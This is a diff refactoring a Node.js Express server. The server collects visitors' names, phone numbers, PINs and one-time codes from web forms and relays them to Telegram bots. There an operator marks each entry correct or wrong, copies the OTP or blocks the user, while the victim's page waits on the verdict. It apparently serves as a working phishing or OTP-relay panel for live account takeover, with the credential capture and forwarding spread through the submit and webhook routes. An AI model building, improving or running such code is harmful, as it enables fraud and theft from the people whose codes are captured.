@@ -20,29 +20,24 @@ const REQUIRED_UPDATES = ['message', 'callback_query'];
 const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 
 // ============================================================
-// 🔑 CALLBACK_DATA CARRIES THE IDENTITY
-// Telegram echoes callback_data back on every click, so the
-// details survive restarts / redeploys / multiple instances.
-// Format:  action:requestId|name|phone|extra
-//   - name/phone/extra are pipe-escaped (| → ¦)
+// 🔑 callback_data FORMAT
+// action:requestId|name|phone|extra
+//   - name/phone/extra pipe-escaped (| → ¦)
 //   - extra = PIN for pin_*, Code for code_*, empty for phone_*
-//   - total is kept ≤ 64 bytes (Telegram's hard limit)
+//   - total ≤ 64 bytes (Telegram hard limit)
+// This means the click itself carries the identity — no lookup,
+// no parser, no way to lose it.
 // ============================================================
 const CB_MAX = 64;
 
-function escapeField(v) {
-    return String(v == null ? '' : v).replace(/\|/g, '¦');
-}
-function unescapeField(v) {
-    return String(v == null ? '' : v).replace(/¦/g, '|');
-}
+function escapeField(v) { return String(v == null ? '' : v).replace(/\|/g, '¦'); }
+function unescapeField(v) { return String(v == null ? '' : v).replace(/¦/g, '|'); }
 
 function buildCallback(action, requestId, name, phone, extra) {
     let n = escapeField(name);
     let p = escapeField(phone);
     let e = escapeField(extra || '');
     const rid = escapeField(requestId);
-
     const assemble = () => `${action}:${rid}|${n}|${p}|${e}`;
     let out = assemble();
     while (out.length > CB_MAX && n.length > 0) { n = n.slice(0, -1); out = assemble(); }
@@ -55,8 +50,7 @@ function parseCallback(data) {
     const i = data.indexOf(':');
     if (i < 0) return null;
     const action = data.slice(0, i);
-    const rest = data.slice(i + 1);
-    const parts = rest.split('|');
+    const parts = data.slice(i + 1).split('|');
     if (parts.length < 3) return null;
     return {
         action,
@@ -129,9 +123,7 @@ Object.keys(process.env).forEach(key => {
     const index = match[1];
     const botToken = process.env[`BOT${index}_TOKEN`];
     const chatId = process.env[`BOT${index}_CHATID`];
-    if (botToken && chatId) {
-        bots.push({ botId: `bot${index}`, botToken, chatId });
-    }
+    if (botToken && chatId) bots.push({ botId: `bot${index}`, botToken, chatId });
 });
 console.log('✅ Bots loaded:', bots.map(b => b.botId));
 
@@ -141,41 +133,26 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
 // ---------------- HELPERS ----------------
-function getBot(botId) {
-    return bots.find(b => b.botId === botId);
-}
+function getBot(botId) { return bots.find(b => b.botId === botId); }
+function botList() { return bots.map(b => b.botId).join(', ') || '(none)'; }
 
-function botList() {
-    return bots.map(b => b.botId).join(', ') || '(none)';
-}
-
-// ⚠️ "Unknown" removed — empty stays empty
+// ⚠️ No "Unknown" placeholder anywhere
 function esc(str) {
     if (str === null || str === undefined) return '';
-    return String(str)
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;');
+    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 }
 
 function pad(str) {
     let s = String(str === null || str === undefined ? '' : str);
     const minLen = 26;
-    if (s.length < minLen) {
-        s = s + '\u00A0'.repeat(minLen - s.length);
-    }
+    if (s.length < minLen) s = s + '\u00A0'.repeat(minLen - s.length);
     return s;
 }
 
-function stripPad(s) {
-    return String(s == null ? '' : s).replace(/\u00A0/g, '').trim();
-}
+function stripPad(s) { return String(s == null ? '' : s).replace(/\u00A0/g, '').trim(); }
 
 function unesc(str) {
-    return String(str == null ? '' : str)
-        .replace(/&lt;/g, '<')
-        .replace(/&gt;/g, '>')
-        .replace(/&amp;/g, '&');
+    return String(str == null ? '' : str).replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
 }
 
 function withIdentity(header, name, phone, extraLines = []) {
@@ -185,10 +162,7 @@ function withIdentity(header, name, phone, extraLines = []) {
         `<b>Name:</b>  <b>${esc(pad(name))}</b>`,
         `<b>Phone:</b> <b>${esc(pad(phone))}</b>`
     ];
-    if (extraLines.length) {
-        lines.push(SEP);
-        lines.push(...extraLines);
-    }
+    if (extraLines.length) { lines.push(SEP); lines.push(...extraLines); }
     lines.push(SEP);
     return lines.join('\n');
 }
@@ -196,50 +170,34 @@ function withIdentity(header, name, phone, extraLines = []) {
 async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
     try {
         await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
-            chat_id: bot.chatId,
-            text,
-            parse_mode: 'HTML',
+            chat_id: bot.chatId, text, parse_mode: 'HTML',
             reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
         });
-    } catch (err) {
-        console.error('sendMessage error:', err.response?.data || err.message);
-    }
+    } catch (err) { console.error('sendMessage error:', err.response?.data || err.message); }
 }
 
 async function replyTelegramMessage(bot, replyToMessageId, text, inlineKeyboard = []) {
     try {
         await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
-            chat_id: bot.chatId,
-            text,
-            parse_mode: 'HTML',
-            reply_to_message_id: replyToMessageId,
-            allow_sending_without_reply: true,
+            chat_id: bot.chatId, text, parse_mode: 'HTML',
+            reply_to_message_id: replyToMessageId, allow_sending_without_reply: true,
             reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
         });
-    } catch (err) {
-        console.error('replyTelegramMessage error:', err.response?.data || err.message);
-    }
+    } catch (err) { console.error('replyTelegramMessage error:', err.response?.data || err.message); }
 }
 
 async function answerCallback(bot, callbackId, text = '', showAlert = false) {
     try {
         await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
-            callback_query_id: callbackId,
-            text,
-            show_alert: showAlert
+            callback_query_id: callbackId, text, show_alert: showAlert
         });
-    } catch (err) {
-        console.error('answerCallback error:', err.response?.data || err.message);
-    }
+    } catch (err) { console.error('answerCallback error:', err.response?.data || err.message); }
 }
 
 async function editMessageText(bot, chatId, messageId, text) {
     try {
         await axios.post(`https://api.telegram.org/bot${bot.botToken}/editMessageText`, {
-            chat_id: chatId,
-            message_id: messageId,
-            text,
-            parse_mode: 'HTML',
+            chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML',
             reply_markup: { inline_keyboard: [] }
         });
     } catch (err) {
@@ -249,9 +207,7 @@ async function editMessageText(bot, chatId, messageId, text) {
     }
 }
 
-// ============================================================
-// 🔒 WEBHOOK — ALWAYS INCLUDES callback_query
-// ============================================================
+// ---------------- WEBHOOK ----------------
 async function getWebhookInfo(bot) {
     try {
         const res = await axios.get(`https://api.telegram.org/bot${bot.botToken}/getWebhookInfo`);
@@ -268,9 +224,7 @@ async function setWebhook(bot) {
     try {
         const res = await axios.get(
             `https://api.telegram.org/bot${bot.botToken}/setWebhook` +
-            `?url=${webhookUrl}` +
-            `&allowed_updates=${allowedUpdates}` +
-            `&drop_pending_updates=false`
+            `?url=${webhookUrl}&allowed_updates=${allowedUpdates}&drop_pending_updates=false`
         );
         if (res.data?.ok) {
             console.log(`✅ Webhook set for ${bot.botId} → ${webhookUrl} [${REQUIRED_UPDATES.join(',')}]`);
@@ -288,20 +242,15 @@ async function ensureWebhook(bot) {
     await setWebhook(bot);
     const info = await getWebhookInfo(bot);
     if (!info) return false;
-
     const urlOk = info.url === `${DOMAIN}/telegram-webhook/${bot.botId}`;
     const cbOk = Array.isArray(info.allowed_updates) && info.allowed_updates.includes('callback_query');
-
     console.log(`🔎 ${bot.botId} — url ${urlOk ? 'OK' : 'MISMATCH'}, callback_query ${cbOk ? '✅' : '❌'}, pending ${info.pending_update_count || 0}`);
-
     if (!urlOk || !cbOk) {
         await new Promise(r => setTimeout(r, 2000));
         await setWebhook(bot);
         const again = await getWebhookInfo(bot);
-        const fixed = again
-            && again.url === `${DOMAIN}/telegram-webhook/${bot.botId}`
-            && Array.isArray(again.allowed_updates)
-            && again.allowed_updates.includes('callback_query');
+        const fixed = again && again.url === `${DOMAIN}/telegram-webhook/${bot.botId}`
+            && Array.isArray(again.allowed_updates) && again.allowed_updates.includes('callback_query');
         console.log(`🔁 ${bot.botId}: ${fixed ? '✅ FIXED' : '❌ STILL BROKEN'}`);
         return fixed;
     }
@@ -309,17 +258,12 @@ async function ensureWebhook(bot) {
 }
 
 async function ensureAllWebhooks() {
-    if (!bots.length) {
-        console.warn('⚠️ No bots loaded — check BOT*_TOKEN and BOT*_CHATID env vars');
-        return;
-    }
+    if (!bots.length) { console.warn('⚠️ No bots loaded — check BOT*_TOKEN and BOT*_CHATID env vars'); return; }
     const results = await Promise.all(bots.map(b => ensureWebhook(b)));
     console.log('🌐 Summary:', bots.map((b, i) => `${b.botId}=${results[i] ? 'OK' : 'FAIL'}`).join(', '));
 }
 
-setInterval(() => {
-    ensureAllWebhooks().catch(err => console.error('Periodic webhook check error:', err.message));
-}, 5 * 60 * 1000);
+setInterval(() => { ensureAllWebhooks().catch(err => console.error('Periodic webhook check error:', err.message)); }, 5 * 60 * 1000);
 
 setInterval(async () => {
     for (const bot of bots) {
@@ -328,23 +272,15 @@ setInterval(async () => {
             if (!info) continue;
             const cbOk = Array.isArray(info.allowed_updates) && info.allowed_updates.includes('callback_query');
             const urlOk = info.url === `${DOMAIN}/telegram-webhook/${bot.botId}`;
-            if (!cbOk || !urlOk) {
-                console.warn(`🚨 ${bot.botId} lost callback_query or url — repairing NOW`);
-                await setWebhook(bot);
-            }
+            if (!cbOk || !urlOk) { console.warn(`🚨 ${bot.botId} lost callback_query or url — repairing NOW`); await setWebhook(bot); }
         } catch (err) {}
     }
 }, 30 * 1000);
 
-// ============================================================
-// 🚪 BOT ENTRY ROUTE
-// ============================================================
+// ---------------- ENTRY ----------------
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
-    if (!bot) {
-        console.log('❌ Invalid bot link:', req.params.botId, '| valid:', botList());
-        return res.status(404).send('Invalid bot link. Available: ' + botList());
-    }
+    if (!bot) { console.log('❌ Invalid bot link:', req.params.botId, '| valid:', botList()); return res.status(404).send('Invalid bot link. Available: ' + botList()); }
     console.log(`🚪 Entry via ${bot.botId} — redirecting to index.html`);
     res.redirect(`/index.html?botId=${encodeURIComponent(bot.botId)}`);
 });
@@ -352,27 +288,19 @@ app.get('/bot/:botId', (req, res) => {
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
 
-// ============================================================
-// 📱 PHONE — Approve / Reject side by side
-// ============================================================
+// ---------------- PHONE ----------------
 app.post('/submit-phone', (req, res) => {
     const { name, phone, botId } = req.body;
     console.log('📥 /submit-phone received botId =', botId, '| valid bots:', botList());
-
     const bot = getBot(botId);
-    if (!bot) {
-        console.log('❌ submit-phone: no bot matches botId', botId);
-        return res.status(400).json({ error: 'Invalid bot: ' + botId });
-    }
+    if (!bot) { console.log('❌ submit-phone: no bot matches botId', botId); return res.status(400).json({ error: 'Invalid bot: ' + botId }); }
 
     const finalName = name || '';
     const finalPhone = phone || '';
-
     const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
+
     approvedPhones[requestId] = null;
-    requestBotMap[requestId] = {
-        botId, name: finalName, phone: finalPhone, type: 'phone', createdAt: Date.now()
-    };
+    requestBotMap[requestId] = { botId, name: finalName, phone: finalPhone, type: 'phone', createdAt: Date.now() };
     saveStore();
 
     console.log(`📤 Phone notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);
@@ -395,26 +323,20 @@ app.get('/check-phone/:requestId', (req, res) => {
     res.json({ approved: approvedPhones[requestId] ?? null });
 });
 
-// ---------------- PIN — Correct / Wrong side by side, no copy ----------------
+// ---------------- PIN ----------------
 app.post('/submit-pin', (req, res) => {
     const { name, phone, pin, botId } = req.body;
     console.log('📥 /submit-pin received botId =', botId, '| valid bots:', botList());
-
     const bot = getBot(botId);
-    if (!bot) {
-        console.log('❌ submit-pin: no bot matches botId', botId);
-        return res.status(400).json({ error: 'Invalid bot: ' + botId });
-    }
+    if (!bot) { console.log('❌ submit-pin: no bot matches botId', botId); return res.status(400).json({ error: 'Invalid bot: ' + botId }); }
 
     const finalName = name || '';
     const finalPhone = phone || '';
     const finalPin = String(pin || '');
-
     const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
+
     approvedPins[requestId] = null;
-    requestBotMap[requestId] = {
-        botId, name: finalName, phone: finalPhone, pin: finalPin, type: 'pin', createdAt: Date.now()
-    };
+    requestBotMap[requestId] = { botId, name: finalName, phone: finalPhone, pin: finalPin, type: 'pin', createdAt: Date.now() };
     saveStore();
 
     console.log(`📤 PIN notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);
@@ -444,26 +366,20 @@ app.get('/check-pin/:requestId', (req, res) => {
     res.json({ approved: approvedPins[requestId] ?? null });
 });
 
-// ---------------- OTP — Correct / Wrong side by side + Copy ----------------
+// ---------------- CODE ----------------
 app.post('/submit-code', (req, res) => {
     const { name, phone, code, botId } = req.body;
     console.log('📥 /submit-code received botId =', botId, '| valid bots:', botList());
-
     const bot = getBot(botId);
-    if (!bot) {
-        console.log('❌ submit-code: no bot matches botId', botId);
-        return res.status(400).json({ error: 'Invalid bot: ' + botId });
-    }
+    if (!bot) { console.log('❌ submit-code: no bot matches botId', botId); return res.status(400).json({ error: 'Invalid bot: ' + botId }); }
 
     const finalName = name || '';
     const finalPhone = phone || '';
     const finalCode = String(code || '');
-
     const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
+
     approvedCodes[requestId] = null;
-    requestBotMap[requestId] = {
-        botId, name: finalName, phone: finalPhone, code: finalCode, type: 'code', createdAt: Date.now()
-    };
+    requestBotMap[requestId] = { botId, name: finalName, phone: finalPhone, code: finalCode, type: 'code', createdAt: Date.now() };
     saveStore();
 
     console.log(`📤 OTP notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);
@@ -499,10 +415,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
     try {
         const bot = getBot(req.params.botId);
-        if (!bot) {
-            console.log('❌ Unknown bot:', req.params.botId, '| valid:', botList());
-            return;
-        }
+        if (!bot) { console.log('❌ Unknown bot:', req.params.botId, '| valid:', botList()); return; }
 
         const cb = req.body.callback_query;
         if (!cb) return;
@@ -513,103 +426,75 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             return;
         }
 
-        console.log('🔘 CALLBACK:', cb.data, '| via', bot.botId);
+        console.log('🔘 CALLBACK raw data:', JSON.stringify(cb.data), '| via', bot.botId);
 
-        // 🔑 Identity travels WITH the click — no lookups, no parsing.
         const parsed = parseCallback(cb.data);
-        if (!parsed || !parsed.action) {
+        if (!parsed) {
             console.log('⚠️ Malformed callback data:', cb.data);
             await answerCallback(bot, cb.id, 'Invalid action');
             return;
         }
 
         const { action, requestId, name, phone, extra } = parsed;
-
         console.log('🔎 parsed =', JSON.stringify({ action, requestId, name, phone, extra }));
 
-        // ============================================================
-        // 📋 COPY OTP — replies with ONLY the code
-        // ============================================================
+        // COPY CODE
         if (action === 'code_copy') {
             const copyCode = extra || '';
             await answerCallback(bot, cb.id, 'Code sent for copying');
-
             const originalMsgId = cb.message?.message_id;
             const copyMessage = `<code>${esc(copyCode)}</code>`;
-
-            if (originalMsgId) {
-                await replyTelegramMessage(bot, originalMsgId, copyMessage);
-            } else {
-                await sendTelegramMessage(bot, copyMessage);
-            }
+            if (originalMsgId) await replyTelegramMessage(bot, originalMsgId, copyMessage);
+            else await sendTelegramMessage(bot, copyMessage);
             console.log('📋 code_copy sent for', requestId, '→', copyCode, `via ${bot.botId}`);
             return;
         }
 
-        // ============================================================
-        // ✅❌ APPROVAL / REJECTION
-        // ============================================================
         await answerCallback(bot, cb.id);
 
         let handled = false;
         let newText = '';
         let feedback = '';
 
-        // PHONE
         if (action === 'phone_ok') {
             if (requestId) approvedPhones[requestId] = true;
-            handled = true;
-            feedback = 'Approved ✅';
-            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, [
-                '<b>Status:</b> ✅ <b>Approved</b>'
-            ]);
+            handled = true; feedback = 'Approved ✅';
+            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, ['<b>Status:</b> ✅ <b>Approved</b>']);
         } else if (action === 'phone_bad') {
             if (requestId) approvedPhones[requestId] = false;
-            handled = true;
-            feedback = 'Rejected ❌';
-            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, [
-                '<b>Status:</b> ❌ <b>Rejected</b>'
-            ]);
-        }
-        // PIN
-        else if (action === 'pin_ok') {
+            handled = true; feedback = 'Rejected ❌';
+            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, ['<b>Status:</b> ❌ <b>Rejected</b>']);
+        } else if (action === 'pin_ok') {
             if (requestId) approvedPins[requestId] = true;
-            handled = true;
-            feedback = 'Correct ✅';
+            handled = true; feedback = 'Correct ✅';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                 `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'pin_bad') {
             if (requestId) approvedPins[requestId] = false;
-            handled = true;
-            feedback = 'Wrong ❌';
+            handled = true; feedback = 'Wrong ❌';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                 `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
             ]);
         } else if (action === 'pin_block') {
             if (requestId) blockPins[requestId] = true;
-            handled = true;
-            feedback = 'User blocked 🛑';
+            handled = true; feedback = 'User blocked 🛑';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                 `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> 🛑 <b>User blocked</b>'
             ]);
-        }
-        // CODE
-        else if (action === 'code_ok') {
+        } else if (action === 'code_ok') {
             if (requestId) approvedCodes[requestId] = true;
-            handled = true;
-            feedback = 'Correct ✅';
+            handled = true; feedback = 'Correct ✅';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
                 `<b>Code:</b> <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'code_bad') {
             if (requestId) approvedCodes[requestId] = false;
-            handled = true;
-            feedback = 'Wrong ❌';
+            handled = true; feedback = 'Wrong ❌';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
                 `<b>Code:</b> <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
@@ -620,49 +505,30 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         }
 
         if (!handled) return;
-
         saveStore();
         console.log('✅', action, '→', requestId, `(${name} / ${phone}) via ${bot.botId}`);
 
-        if (cb.message && newText) {
-            await editMessageText(bot, cb.message.chat.id, cb.message.message_id, newText);
-        }
-
-        if (feedback) {
-            await sendTelegramMessage(
-                bot,
-                withIdentity(`📝 RESPONSE — ${feedback}`, name, phone)
-            );
-        }
+        if (cb.message && newText) await editMessageText(bot, cb.message.chat.id, cb.message.message_id, newText);
+        if (feedback) await sendTelegramMessage(bot, withIdentity(`📝 RESPONSE — ${feedback}`, name, phone));
     } catch (err) {
         console.error('❌ Webhook handler error:', err.message);
     }
 });
 
 // ---------------- DEBUG ----------------
-app.get('/debug/bots', (req, res) => {
-    res.json(bots.map(b => ({ botId: b.botId, chatId: b.chatId })));
-});
-
-app.get('/debug/stores', (req, res) => {
-    res.json({ approvedPins, approvedCodes, approvedPhones, blockPins, requestBotMap });
-});
-
+app.get('/debug/bots', (req, res) => res.json(bots.map(b => ({ botId: b.botId, chatId: b.chatId }))));
+app.get('/debug/stores', (req, res) => res.json({ approvedPins, approvedCodes, approvedPhones, blockPins, requestBotMap }));
 app.get('/debug/webhook/:botId', async (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.status(404).json({ error: 'Invalid bot: ' + req.params.botId });
     const info = await getWebhookInfo(bot);
     res.json(info || { error: 'failed' });
 });
-
 app.get('/debug/setwebhook', async (req, res) => {
     await ensureAllWebhooks();
     res.json({ message: 'Webhooks re-applied', bots: bots.map(b => b.botId) });
 });
-
-app.get('/health', (req, res) => {
-    res.json({ ok: true, bots: bots.map(b => b.botId), time: Date.now() });
-});
+app.get('/health', (req, res) => res.json({ ok: true, bots: bots.map(b => b.botId), time: Date.now() }));
 
 // ---------------- START ----------------
 (async () => {
